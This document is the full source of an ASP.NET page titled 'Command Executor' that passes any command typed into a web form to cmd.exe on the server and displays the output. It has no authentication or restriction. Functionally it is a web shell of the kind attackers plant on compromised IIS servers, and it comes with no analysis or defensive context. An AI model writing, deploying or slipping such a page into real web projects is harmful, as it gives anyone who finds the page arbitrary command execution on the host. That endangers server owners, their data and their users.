<%@ Page Language="C#" Debug="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.IO" %>

<!DOCTYPE html>
<html>
<head>
    <title>Command Executor</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            color: #333;
            padding: 20px;
        }
        h1 {
            color: #0066cc;
        }
        .command-form {
            margin-bottom: 20px;
        }
        .command-output {
            background-color: #fff;
            border: 1px solid #ccc;
            padding: 15px;
            white-space: pre-wrap;
            font-family: monospace;
        }
    </style>
</head>
<body>
    <h1>Execute Command</h1>
    <form method="post" class="command-form">
        <label for="command">Enter Command:</label>
        <input type="text" id="command" name="command" style="width: 300px;" />
        <input type="submit" value="Run" />
    </form>

    <div class="command-output">
        <h2>Output:</h2>
        <pre>
        <%
            if (IsPostBack)
            {
                string command = Request.Form["command"];
                if (!string.IsNullOrEmpty(command))
                {
                    try
                    {
                        Process process = new Process();
                        process.StartInfo.FileName = "cmd.exe";
                        process.StartInfo.Arguments = "/c " + command; // تنفيذ الأمر المدخل
                        process.StartInfo.UseShellExecute = false;
                        process.StartInfo.RedirectStandardOutput = true;
                        process.StartInfo.RedirectStandardError = true;
                        process.StartInfo.CreateNoWindow = true;
                        process.Start();

                        string output = process.StandardOutput.ReadToEnd();
                        string error = process.StandardError.ReadToEnd();
                        process.WaitForExit();

                        if (!string.IsNullOrEmpty(output))
                        {
                            Response.Write(Server.HtmlEncode(output));
                        }

                        if (!string.IsNullOrEmpty(error))
                        {
                            Response.Write("<span style='color: red;'>" + Server.HtmlEncode(error) + "</span>");
                        }
                    }
                    catch (Exception ex)
                    {
                        Response.Write("<span style='color: red;'>Error: " + Server.HtmlEncode(ex.Message) + "</span>");
                    }
                }
            }
        %>
        </pre>
    </div>
</body>
</html>
